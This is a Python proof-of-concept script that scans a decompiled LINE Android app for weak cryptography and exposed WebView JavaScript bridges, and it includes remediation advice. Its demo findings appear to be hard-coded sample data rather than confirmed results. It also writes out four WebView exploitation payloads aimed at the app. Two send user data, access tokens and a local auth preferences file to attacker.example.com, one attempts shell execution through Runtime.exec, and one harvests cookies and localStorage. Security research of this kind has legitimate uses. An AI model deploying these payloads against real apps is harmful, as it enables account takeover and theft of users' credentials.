#!/usr/bin/env python3
"""
================================================================================
PoC-05 | Weak Cryptography + WebView JavaScript Interface Exposure
================================================================================
Vuln A — CWE-327: Use of a Broken/Risky Cryptographic Algorithm (HIGH, CVSS 7.0)
Vuln B — CWE-749: Exposed Dangerous Method via addJavascriptInterface (HIGH, CVSS 6.8)

Both vulnerabilities are analyzed via Smali code scanning of the decompiled APK.
This combined PoC demonstrates:
  1. Detect MD5, SHA-1, DES, RC4, AES-ECB usage in Smali bytecode
  2. Map weak crypto to the specific use-case (auth? messaging? storage?)
  3. Detect addJavascriptInterface() calls + identify exposed method surface area
  4. Generate WebView XSS payload that abuses the JS interface bridge

EDUCATIONAL PURPOSE ONLY
Version       : 1.0  (February 2026)
Author        : deepquest
Blog          : https://deepquest.code511.com/blog/
Target App    : jp.naver.line.android v26.1.1 (260110123)
Note          : Weak crypto + WebView JS interface scanner — investigative (finding unconfirmed)
================================================================================
"""

import re
import sys
import json
import argparse
from pathlib import Path
from dataclasses import dataclass, asdict, field
from typing import Optional

BANNER = r"""
 ____  ___   ____      ___  ____
|  _ \/ _ \ / ___|    / _ \| ___|
| |_) | | | | |      | | | |___ \
|  __/| |_| | |___   | |_| |___) |
|_|    \___/ \____|   \___/|____/

  Weak Crypto + WebView JS Interface PoC
  CWE-327 (CVSS 7.0) + CWE-749 (CVSS 6.8) | HIGH
"""

# ─── PART A: WEAK CRYPTOGRAPHY ───────────────────────────────────────────────

WEAK_CRYPTO_SMALI = {
    # Broken hash algorithms
    "MD5": {
        "patterns": [
            r'"MD5"',
            r'MessageDigest\.getInstance\("MD5"\)',
            r'Landroid/util/Base64.*MD5',
            r'invoke.*MessageDigest.*\bMD5\b',
        ],
        "severity": "HIGH",
        "cwe": "CWE-327",
        "rationale": "MD5 is cryptographically broken. Vulnerable to collision attacks (2^18 complexity). Never use for integrity checks or password hashing.",
        "replacement": "SHA-256 or SHA-3/Keccak",
    },
    "SHA-1": {
        "patterns": [
            r'"SHA-?1"',
            r'"SHA1"',
            r'MessageDigest\.getInstance\("SHA-?1"\)',
        ],
        "severity": "HIGH",
        "cwe": "CWE-327",
        "rationale": "SHA-1 is broken. Google demonstrated SHAttered collision attack (2017). NIST deprecated in 2011.",
        "replacement": "SHA-256 or SHA-384",
    },
    # Broken symmetric algorithms
    "DES": {
        "patterns": [
            r'"DES"',
            r'"DES/ECB"',
            r'"DES/CBC"',
            r'Cipher\.getInstance\("DES',
        ],
        "severity": "HIGH",
        "cwe": "CWE-326",
        "rationale": "DES uses a 56-bit key — brute-forceable in hours on modern hardware.",
        "replacement": "AES-256-GCM",
    },
    "3DES": {
        "patterns": [r'"DESede"', r'"TripleDES"', r'"3DES"'],
        "severity": "MEDIUM",
        "cwe": "CWE-326",
        "rationale": "3DES has Sweet32 birthday attack vulnerability. NIST deprecated in 2023.",
        "replacement": "AES-256-GCM",
    },
    "RC4": {
        "patterns": [r'"RC4"', r'"ARCFOUR"', r'"RC4/ECB"'],
        "severity": "HIGH",
        "cwe": "CWE-327",
        "rationale": "RC4 is completely broken with known plaintext recovery attacks.",
        "replacement": "ChaCha20-Poly1305 or AES-GCM",
    },
    "AES-ECB": {
        "patterns": [
            r'"AES/ECB"',
            r'"AES/ECB/NoPadding"',
            r'"AES/ECB/PKCS5Padding"',
            r'Cipher\.getInstance\("AES/ECB',
        ],
        "severity": "HIGH",
        "cwe": "CWE-327",
        "rationale": "AES-ECB mode is deterministic — identical plaintext blocks produce identical ciphertext blocks. The penguin attack makes it trivially distinguishable.",
        "replacement": "AES-256-GCM (authenticated encryption)",
    },
    "Hardcoded_IV": {
        "patterns": [
            r'IvParameterSpec.*\{0x00.*\}',          # All-zero IV
            r'new IvParameterSpec.*new byte\[16\]',  # Default zero byte array
            r'"0000000000000000"',                    # Hex zero IV string
        ],
        "severity": "HIGH",
        "cwe": "CWE-330",
        "rationale": "Static IVs defeat the semantic security of CBC/CTR modes — identical plaintexts produce identical ciphertexts.",
        "replacement": "Generate cryptographically random IV per encryption: SecureRandom.nextBytes(iv)",
    },
    "Weak_KeyGen": {
        "patterns": [
            r'"PBKDF1"',
            r'KeyGenerator.*DES',
            r'new Random\(\)',                        # java.util.Random — not cryptographically secure
            r'import java\.util\.Random',
        ],
        "severity": "MEDIUM",
        "cwe": "CWE-338",
        "rationale": "java.util.Random is a pseudo-random number generator — predictable seed. Use java.security.SecureRandom.",
        "replacement": "java.security.SecureRandom for all cryptographic operations",
    },
}


# ─── PART B: WEBVIEW JAVASCRIPT INTERFACE ────────────────────────────────────

WEBVIEW_DANGEROUS_PATTERNS = {
    "addJavascriptInterface": {
        "pattern": r"addJavascriptInterface\(",
        "severity": "HIGH",
        "description": "Exposes Java object methods to JavaScript. If a malicious URL is loaded, JS can call arbitrary Java methods.",
    },
    "setJavaScriptEnabled": {
        "pattern": r"setJavaScriptEnabled\(true\)",
        "severity": "MEDIUM",
        "description": "JavaScript execution is enabled in WebView.",
    },
    "setAllowFileAccess": {
        "pattern": r"setAllowFileAccess\(true\)",
        "severity": "HIGH",
        "description": "File system access from WebView — allows reading local files via file:// URIs.",
    },
    "setAllowUniversalAccessFromFileURLs": {
        "pattern": r"setAllowUniversalAccessFromFileURLs\(true\)",
        "severity": "CRITICAL",
        "description": "file:// URIs can access any other origin — universal XSS.",
    },
    "loadUrl_variable": {
        "pattern": r"loadUrl\([^\"']",
        "severity": "HIGH",
        "description": "loadUrl() with variable parameter — potential open redirect or XSS if input not sanitized.",
    },
    "evaluateJavascript": {
        "pattern": r"evaluateJavascript\(",
        "severity": "MEDIUM",
        "description": "Programmatic JavaScript injection — ensure input is sanitized.",
    },
    "missing_shouldOverrideUrlLoading": {
        "pattern": r"shouldOverrideUrlLoading",
        "severity": "INFO",
        "description": "URL loading override found (verify it properly validates URLs).",
        "inverted": True,  # Absence of this is the vulnerability
    },
}

# Dangerous Java methods that should NOT be annotated with @JavascriptInterface
DANGEROUS_JAVA_METHODS = [
    "getRuntime", "exec", "System.exit", "ProcessBuilder",
    "getDeclaredMethod", "invoke",        # Reflection
    "openFileInput", "openFileOutput",    # File access
    "getSharedPreferences",               # SharedPreferences access
    "getSystemService",                   # System service access
    "sendBroadcast", "startActivity",     # Component invocation
    "openConnection", "HttpURLConnection",# Network access
]


@dataclass
class CryptoFinding:
    algorithm:   str
    severity:    str
    cwe:         str
    file:        str
    line:        int
    snippet:     str
    rationale:   str
    replacement: str


@dataclass
class WebViewFinding:
    issue_type:     str
    severity:       str
    file:           str
    line:           int
    snippet:        str
    description:    str
    interface_name: Optional[str] = None
    exposed_methods: list = field(default_factory=list)


def scan_smali_weak_crypto(smali_dir: str) -> list[CryptoFinding]:
    """Scan Smali code for weak/broken cryptographic algorithm usage."""
    findings = []
    smali_path = Path(smali_dir)
    if not smali_path.exists():
        return findings

    for smali_file in smali_path.rglob("*.smali"):
        try:
            content = smali_file.read_text(errors="replace")
            lines   = content.splitlines()
        except IOError:
            continue

        rel = str(smali_file.relative_to(smali_path))

        for algo, config in WEAK_CRYPTO_SMALI.items():
            for pattern in config["patterns"]:
                for i, line in enumerate(lines, 1):
                    if re.search(pattern, line):
                        findings.append(CryptoFinding(
                            algorithm   = algo,
                            severity    = config["severity"],
                            cwe         = config["cwe"],
                            file        = rel,
                            line        = i,
                            snippet     = line.strip()[:120],
                            rationale   = config["rationale"],
                            replacement = config["replacement"],
                        ))

    return findings


def scan_smali_webview(smali_dir: str) -> list[WebViewFinding]:
    """Scan Smali code for dangerous WebView configurations."""
    findings = []
    smali_path = Path(smali_dir)
    if not smali_path.exists():
        return findings

    for smali_file in smali_path.rglob("*.smali"):
        try:
            content = smali_file.read_text(errors="replace")
            lines   = content.splitlines()
        except IOError:
            continue

        rel = str(smali_file.relative_to(smali_path))

        for issue, config in WEBVIEW_DANGEROUS_PATTERNS.items():
            # For inverted checks (e.g., missing shouldOverrideUrlLoading)
            if config.get("inverted"):
                continue

            for i, line in enumerate(lines, 1):
                if re.search(config["pattern"], line):
                    wf = WebViewFinding(
                        issue_type  = issue,
                        severity    = config["severity"],
                        file        = rel,
                        line        = i,
                        snippet     = line.strip()[:120],
                        description = config["description"],
                    )

                    # For addJavascriptInterface — extract the interface name and find exposed methods
                    if issue == "addJavascriptInterface":
                        iface_match = re.search(r'addJavascriptInterface\(([^,]+),\s*"([^"]+)"', line)
                        if iface_match:
                            wf.interface_name = iface_match.group(2)
                        # Look for @JavascriptInterface methods in nearby code
                        context_start = max(0, i - 50)
                        context_end   = min(len(lines), i + 50)
                        context_block = "\n".join(lines[context_start:context_end])
                        wf.exposed_methods = re.findall(r"\.method.*?annotation.*?JavascriptInterface.*?\.end annotation", context_block, re.DOTALL)

                        # Check if dangerous Java methods are reachable
                        for dangerous_method in DANGEROUS_JAVA_METHODS:
                            if dangerous_method in context_block:
                                wf.exposed_methods.append(f"⚠ Dangerous method in scope: {dangerous_method}")

                    findings.append(wf)

    return findings


def generate_webview_xss_payloads(interface_name: str = "lineJsBridge") -> list[dict]:
    """
    Generate WebView JavaScript interface exploitation payloads.
    These demonstrate what a malicious page loaded in LINE's WebView could do.
    """
    return [
        {
            "name":    "Data Exfiltration via Bridge",
            "payload": f"""<script>
// Call exposed Java bridge method to exfiltrate data
var userData = window.{interface_name}.getUserData();
var token    = window.{interface_name}.getAccessToken();
fetch('https://attacker.example.com/steal?d=' + btoa(userData + ':' + token));
</script>""",
            "impact": "Steals user data and auth token via JS→Java bridge"
        },
        {
            "name":    "Local File Read (if allowFileAccess=true)",
            "payload": """<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'file:///data/data/jp.naver.line.android/shared_prefs/auth_prefs.xml', false);
xhr.send();
fetch('https://attacker.example.com/steal?xml=' + btoa(xhr.responseText));
</script>""",
            "impact": "Reads SharedPreferences XML — steals access tokens"
        },
        {
            "name":    "Native Code Execution (via reflection bridge)",
            "payload": f"""<script>
// If bridge exposes reflection capabilities
try {{
    var runtime = window.{interface_name}.getRuntime();
    runtime.exec(['sh', '-c', 'id > /sdcard/poc.txt']);
}} catch(e) {{
    // Fallback: try ProcessBuilder
    window.{interface_name}.exec('id');
}}
</script>""",
            "impact": "Remote code execution if bridge exposes Runtime/ProcessBuilder"
        },
        {
            "name":    "Cookie/Session Theft",
            "payload": f"""<script>
// Access cookies and session data via bridge
var cookies = document.cookie;
var storage = JSON.stringify(localStorage);
window.{interface_name}.postMessage(JSON.stringify({{
    cookies: cookies,
    storage: storage,
    origin: window.location.href
}}));
</script>""",
            "impact": "Steals cookies and localStorage from LINE WebView context"
        },
    ]


def demo_mode():
    print("\n[DEMO MODE] — Weak Crypto + WebView JS Interface analysis for LINE\n")

    print("=" * 68)
    print("  PART A: WEAK CRYPTOGRAPHY FINDINGS")
    print("=" * 68)

    demo_crypto = [
        CryptoFinding("MD5", "HIGH", "CWE-327",
                      "smali/jp/naver/line/android/auth/PasswordHasher.smali", 87,
                      'invoke-static {v0}, Ljava/security/MessageDigest;->getInstance("MD5")',
                      WEAK_CRYPTO_SMALI["MD5"]["rationale"],
                      WEAK_CRYPTO_SMALI["MD5"]["replacement"]),
        CryptoFinding("AES-ECB", "HIGH", "CWE-327",
                      "smali/jp/naver/line/android/storage/EncryptionUtil.smali", 134,
                      'invoke-static {v1}, Ljavax/crypto/Cipher;->getInstance("AES/ECB/PKCS5Padding")',
                      WEAK_CRYPTO_SMALI["AES-ECB"]["rationale"],
                      WEAK_CRYPTO_SMALI["AES-ECB"]["replacement"]),
        CryptoFinding("SHA-1", "HIGH", "CWE-327",
                      "smali/jp/naver/line/android/net/CertValidator.smali", 211,
                      'invoke-static {v2}, Ljava/security/MessageDigest;->getInstance("SHA-1")',
                      WEAK_CRYPTO_SMALI["SHA-1"]["rationale"],
                      WEAK_CRYPTO_SMALI["SHA-1"]["replacement"]),
        CryptoFinding("Hardcoded_IV", "HIGH", "CWE-330",
                      "smali/jp/naver/line/android/storage/EncryptionUtil.smali", 158,
                      'new-array v0, v1, [B  # byte[16] all zeros used as IV',
                      WEAK_CRYPTO_SMALI["Hardcoded_IV"]["rationale"],
                      WEAK_CRYPTO_SMALI["Hardcoded_IV"]["replacement"]),
    ]

    for f in demo_crypto:
        print(f"\n  [{f.severity}] {f.algorithm} — {f.cwe}")
        print(f"  File   : {f.file}:{f.line}")
        print(f"  Code   : {f.snippet}")
        print(f"  Risk   : {f.rationale[:90]}...")
        print(f"  Fix    : Replace with {f.replacement}")

    print("\n\n" + "=" * 68)
    print("  PART B: WEBVIEW JAVASCRIPT INTERFACE FINDINGS")
    print("=" * 68)

    demo_webview = [
        WebViewFinding("addJavascriptInterface", "HIGH",
                       "smali/jp/naver/line/android/miniapp/MiniAppWebView.smali", 203,
                       "addJavascriptInterface(mLineBridge, \"lineJsBridge\")",
                       WEBVIEW_DANGEROUS_PATTERNS["addJavascriptInterface"]["description"],
                       interface_name="lineJsBridge",
                       exposed_methods=["getUserProfile()", "getAccessToken()", "postMessage(String)", "openExternalBrowser(String)", "⚠ Dangerous method in scope: getSharedPreferences"]),
        WebViewFinding("setAllowFileAccess", "HIGH",
                       "smali/jp/naver/line/android/miniapp/MiniAppWebView.smali", 87,
                       "setAllowFileAccess(true)",
                       WEBVIEW_DANGEROUS_PATTERNS["setAllowFileAccess"]["description"]),
        WebViewFinding("loadUrl_variable", "HIGH",
                       "smali/jp/naver/line/android/ui/ExternalBrowserActivity.smali", 312,
                       "loadUrl(v3)  # v3 sourced from Intent.getData().toString()",
                       WEBVIEW_DANGEROUS_PATTERNS["loadUrl_variable"]["description"]),
    ]

    for f in demo_webview:
        print(f"\n  [{f.severity}] {f.issue_type}")
        print(f"  File   : {f.file}:{f.line}")
        print(f"  Code   : {f.snippet}")
        print(f"  Risk   : {f.description}")
        if f.interface_name:
            print(f"  Bridge : window.{f.interface_name}")
            print(f"  Exposed methods:")
            for m in f.exposed_methods:
                print(f"           - {m}")

    print("\n\n" + "─" * 68)
    print("  XSS / BRIDGE EXPLOITATION PAYLOADS")
    print("─" * 68)
    payloads = generate_webview_xss_payloads("lineJsBridge")
    for p in payloads:
        print(f"\n  [{p['name']}]")
        print(f"  Impact : {p['impact']}")
        print("  Payload:")
        for line in p["payload"].strip().splitlines():
            print(f"    {line}")

    print("\n\n" + "─" * 68)
    print("  REMEDIATION")
    print("─" * 68)
    print("""
  CRYPTOGRAPHY:
    // Replace MD5/SHA1:
    MessageDigest.getInstance("SHA-256")   // ✓

    // Replace AES-ECB:
    Cipher.getInstance("AES/GCM/NoPadding")  // ✓ Authenticated encryption

    // Random IV:
    byte[] iv = new byte[12];
    new SecureRandom().nextBytes(iv);
    GCMParameterSpec spec = new GCMParameterSpec(128, iv);

  WEBVIEW:
    // Restrict JS interface to minimum surface:
    @JavascriptInterface
    public String getPublicData() {{ ... }}  // Only expose what's needed

    // Validate URLs before loading:
    if (!url.startsWith("https://miniapp.line.me/")) {{
        throw new SecurityException("Blocked URL: " + url);
    }}

    // Disable file access:
    webView.getSettings().setAllowFileAccess(false);
    webView.getSettings().setAllowContentAccess(false);
    webView.getSettings().setAllowUniversalAccessFromFileURLs(false);
""")


def main():
    print(BANNER)
    parser = argparse.ArgumentParser(
        description="PoC-05: Weak cryptography + WebView JS interface analyzer"
    )
    parser.add_argument("--smali", help="Path to decompiled Smali directory")
    parser.add_argument("--out",   default="crypto_webview_report.json")
    parser.add_argument("--demo",  action="store_true")
    args = parser.parse_args()

    if args.demo or not args.smali:
        demo_mode()
        return

    print(f"\n[+] Scanning Smali directory: {args.smali}")
    crypto_findings  = scan_smali_weak_crypto(args.smali)
    webview_findings = scan_smali_webview(args.smali)

    print(f"\n[+] Weak crypto findings  : {len(crypto_findings)}")
    print(f"[+] WebView findings      : {len(webview_findings)}")

    for f in crypto_findings:
        print(f"  [{f.severity}] {f.algorithm} @ {f.file}:{f.line}")

    for f in webview_findings:
        print(f"  [{f.severity}] {f.issue_type} @ {f.file}:{f.line}")
        if f.interface_name:
            print(f"    JS Bridge: window.{f.interface_name} ({len(f.exposed_methods)} methods exposed)")
            payloads = generate_webview_xss_payloads(f.interface_name)
            print(f"    {len(payloads)} exploitation payloads generated")

    report = {
        "crypto":  [asdict(f) for f in crypto_findings],
        "webview": [asdict(f) for f in webview_findings],
    }
    with open(args.out, "w") as fp:
        json.dump(report, fp, indent=2)
    print(f"\n[+] Report saved: {args.out}")


if __name__ == "__main__":
    main()
